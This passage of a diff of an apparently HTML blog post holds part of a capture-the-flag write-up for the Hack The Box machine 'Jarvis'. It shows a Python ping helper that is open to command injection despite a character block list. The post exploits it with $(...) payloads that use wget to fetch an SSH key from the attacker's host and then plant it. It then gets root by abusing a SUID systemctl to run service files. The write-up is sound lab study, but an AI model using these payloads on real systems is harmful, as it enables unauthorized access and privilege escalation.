class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' - Attack Level : '</span> <span class="o">+</span> <span class="n">level</span><span class="p">)</span>
         <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
     <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">req</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="s1">''</span>
+    <span class="n">req</span><span class="o">=</span><span class="s1">''</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
-        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
-            <span class="n">fecha</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">7</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-            <span class="n">regex</span> <span class="o">=</span> <span class="s1">&#39;(\d+)-(.*)-(\d+)(.*)&#39;</span>
+        <span class="k">if</span> <span class="s1">'Level'</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
+            <span class="n">fecha</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">7</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="n">regex</span> <span class="o">=</span> <span class="s1">'(\d+)-(.*)-(\d+)(.*)'</span>
             <span class="n">logEx</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">fecha</span><span class="p">)</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
             <span class="n">mes</span> <span class="o">=</span> <span class="n">to_dict</span><span class="p">(</span><span class="n">logEx</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-            <span class="n">fecha</span> <span class="o">=</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">mes</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-            <span class="n">fecha</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">fecha</span><span class="p">,</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span>
+            <span class="n">fecha</span> <span class="o">=</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'-'</span> <span class="o">+</span> <span class="n">mes</span> <span class="o">+</span> <span class="s1">'-'</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+            <span class="n">fecha</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">fecha</span><span class="p">,</span> <span class="s1">'%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S'</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
                 <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
-                <span class="n">req</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
+                <span class="n">req</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
     <span class="k">return</span> <span class="n">dat</span><span class="p">,</span> <span class="n">req</span>
 
 <span class="k">def</span> <span class="nf">to_dict</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
-    <span class="n">month_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Jan&#39;</span><span class="p">:</span><span class="s1">&#39;01&#39;</span><span class="p">,</span><span class="s1">&#39;Feb&#39;</span><span class="p">:</span><span class="s1">&#39;02&#39;</span><span class="p">,</span><span class="s1">&#39;Mar&#39;</span><span class="p">:</span><span class="s1">&#39;03&#39;</span><span class="p">,</span><span class="s1">&#39;Apr&#39;</span><span class="p">:</span><span class="s1">&#39;04&#39;</span><span class="p">,</span> <span class="s1">&#39;May&#39;</span><span class="p">:</span><span class="s1">&#39;05&#39;</span><span class="p">,</span> <span class="s1">&#39;Jun&#39;</span><span class="p">:</span><span class="s1">&#39;06&#39;</span><span class="p">,</span><span class="s1">&#39;Jul&#39;</span><span class="p">:</span><span class="s1">&#39;07&#39;</span><span class="p">,</span><span class="s1">&#39;Aug&#39;</span><span class="p">:</span><span class="s1">&#39;08&#39;</span><span class="p">,</span><span class="s1">&#39;Sep&#39;</span><span class="p">:</span><span class="s1">&#39;09&#39;</span><span class="p">,</span><span class="s1">&#39;Oct&#39;</span><span class="p">:</span><span class="s1">&#39;10&#39;</span><span class="p">,</span><span class="s1">&#39;Nov&#39;</span><span class="p">:</span><span class="s1">&#39;11&#39;</span><span class="p">,</span><span class="s1">&#39;Dec&#39;</span><span class="p">:</span><span class="s1">&#39;12&#39;</span><span class="p">}</span>
+    <span class="n">month_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'Jan'</span><span class="p">:</span><span class="s1">'01'</span><span class="p">,</span><span class="s1">'Feb'</span><span class="p">:</span><span class="s1">'02'</span><span class="p">,</span><span class="s1">'Mar'</span><span class="p">:</span><span class="s1">'03'</span><span class="p">,</span><span class="s1">'Apr'</span><span class="p">:</span><span class="s1">'04'</span><span class="p">,</span> <span class="s1">'May'</span><span class="p">:</span><span class="s1">'05'</span><span class="p">,</span> <span class="s1">'Jun'</span><span class="p">:</span><span class="s1">'06'</span><span class="p">,</span><span class="s1">'Jul'</span><span class="p">:</span><span class="s1">'07'</span><span class="p">,</span><span class="s1">'Aug'</span><span class="p">:</span><span class="s1">'08'</span><span class="p">,</span><span class="s1">'Sep'</span><span class="p">:</span><span class="s1">'09'</span><span class="p">,</span><span class="s1">'Oct'</span><span class="p">:</span><span class="s1">'10'</span><span class="p">,</span><span class="s1">'Nov'</span><span class="p">:</span><span class="s1">'11'</span><span class="p">,</span><span class="s1">'Dec'</span><span class="p">:</span><span class="s1">'12'</span><span class="p">}</span>
     <span class="k">return</span> <span class="n">month_dict</span><span class="p">[</span><span class="n">name</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
     <span class="n">level</span><span class="o">=</span><span class="mi">0</span>
     <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
-        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span>
-            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="p">):</span>
-                <span class="n">level</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
-                <span class="n">req</span><span class="o">=</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
+        <span class="k">if</span> <span class="s1">'Level'</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="p">):</span>
+                <span class="n">level</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
+                <span class="n">req</span><span class="o">=</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
     <span class="k">return</span> <span class="n">level</span><span class="p">,</span> <span class="n">req</span>
 
 <span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
-    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;||&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">]</span>
-    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter an IP: &#39;</span><span class="p">)</span>
+    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'&amp;'</span><span class="p">,</span> <span class="s1">';'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="s1">'`'</span><span class="p">,</span> <span class="s1">'||'</span><span class="p">,</span> <span class="s1">'|'</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">'Enter an IP: '</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Got you&#39;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">'Got you'</span><span class="p">)</span>
             <span class="n">exit</span><span class="p">()</span>
-    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
     <span class="n">show_header</span><span class="p">()</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
         <span class="n">show_help</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
-    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-h&#39;</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;--help&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'-h'</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'--help'</span><span class="p">:</span>
         <span class="n">show_help</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-s&#39;</span><span class="p">:</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'-s'</span><span class="p">:</span>
         <span class="n">show_statistics</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-l&#39;</span><span class="p">:</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'-l'</span><span class="p">:</span>
         <span class="n">list_ip</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-p&#39;</span><span class="p">:</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'-p'</span><span class="p">:</span>
         <span class="n">exec_ping</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">show_help</span><span class="p">()</span>
         <span class="n">exit</span><span class="p">()</span>
 </code></pre></div>
-
 <p>We notice the <code>exec_ping</code> function calling <code>os.system()</code>. As there is forbidden
 character we cannot simply execute a second command (with a <code>;</code> or a <code>&amp;&amp;</code>).
 Nevertheless we can try to ping the result of a command with the following
@@ -499,12 +443,10 @@ We mount a python web server with our ssh public key renamed <code>authorized\_k
 download it from the box:</p>
 <div class="highlight"><pre><span></span><code>Enter an IP: $(wget 10.10.15.31:8080/authorized_keys)
 </code></pre></div>
-
 <p>We then create the <code>.ssh</code> folder in pepper home and move the key:</p>
 <div class="highlight"><pre><span></span><code>Enter an IP: $(mkdir /home/pepper/.ssh)
 Enter an IP: $(mv authorized_keys /home/pepper/.ssh/)
 </code></pre></div>
-
 <p>We can then connect to the box with ssh and get the user flag:</p>
 <div class="highlight"><pre><span></span><code>ssh -lpepper 10.10.10.143
 Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
@@ -513,7 +455,6 @@ Last login: Thu Oct  3 09:38:52 2019 from 10.10.15.31
 pepper@jarvis:~$ cat user.txt 
 2afa36&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Let's get root</h1>
 <p>We enumerate the box as always.
 We found that the systemctl binary is SUID.</p>
@@ -534,45 +475,39 @@ We found that the systemctl binary is SUID.</p>
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 </code></pre></div>
-
 <p><a href="https://gtfobins.github.io/gtfobins/systemctl/#suid">GTFOBins</a> show how
 to exploit that misconfiguration.
 First we create a temporary file:</p>
 <div class="highlight"><pre><span></span><code>pepper@jarvis:~$ TF=$(mktemp).service
 </code></pre></div>
-
 <p>We write a service file inside. This service run the command <code>id</code> and put the
 result in a file:</p>
-<div class="highlight"><pre><span></span><code>pepper@jarvis:~$ echo &#39;[Service]
+<div class="highlight"><pre><span></span><code>pepper@jarvis:~$ echo '[Service]
 &gt; Type=oneshot
-&gt; ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;
+&gt; ExecStart=/bin/sh -c "id &gt; /tmp/output"
 &gt; [Install]
-&gt; WantedBy=multi-user.target&#39; &gt; $TF
+&gt; WantedBy=multi-user.target' &gt; $TF
 </code></pre></div>
-
 <p>We link the service using sysemctl:</p>
 <div class="highlight"><pre><span></span><code>pepper@jarvis:~$ /bin/systemctl link $TF
 Created symlink /etc/systemd/system/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.
 </code></pre></div>
-
 <p>We start the service using sysemctl:</p>
 <div class="highlight"><pre><span></span><code>pepper@jarvis:~$ /bin/systemctl enable --now $TF
 Created symlink /etc/systemd/system/multi-user.target.wants/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.
 </code></pre></div>
-
 <p>We get the result of the <code>id</code> command in <code>/tmp/output</code>.</p>
 <div class="highlight"><pre><span></span><code>pepper@jarvis:~$ cat /tmp/output 
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre></div>
-
 <p>The command was executed. Now we create a second service which will output the
 root's flag:</p>
 <div class="highlight"><pre><span></span><code>pepper@jarvis:~$ TF2=$(mktemp).service
-pepper@jarvis:~$ echo &#39;[Service]
+pepper@jarvis:~$ echo '[Service]
 &gt; Type=oneshot
-&gt; ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;
+&gt; ExecStart=/bin/sh -c "cat /root/root.txt &gt; /tmp/output"
 &gt; [Install]
-&gt; WantedBy=multi-user.target&#39; &gt; $TF2
+&gt; WantedBy=multi-user.target' &gt; $TF2
 pepper@jarvis:~$ /bin/systemctl link $TF2
 Created symlink /etc/systemd/system/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.
 pepper@jarvis:~$ /bin/systemctl enable --now $TF2
@@ -580,68 +515,46 @@ Created symlink /etc/systemd/system/multi-user.target.wants/tmp.ZcSgmH8PDr.servi
 pepper@jarvis:~$ cat /tmp/output 
 d41d8&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was a nice one. It has been a long time since my last usage of
 <code>sqlmap --os-shell</code> command.
 The movement from <code>www-data</code> to <code>pepper</code> was easy and the privilege
 escalation let me learn new things about systemd.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/sqli.html">SQLi</a>
-      <a href="../../tag/linux.html">linux</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2019/10/htb-ellingson.html" title="HTB: Ellingson">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2019/12/htb-heist.html" title="HTB: Heist">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/sqli.html">SQLi</a>
+<a href="../../tag/linux.html">linux</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2019/10/htb-ellingson.html" title="HTB: Ellingson">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2019/12/htb-heist.html" title="HTB: Heist">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -652,6 +565,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
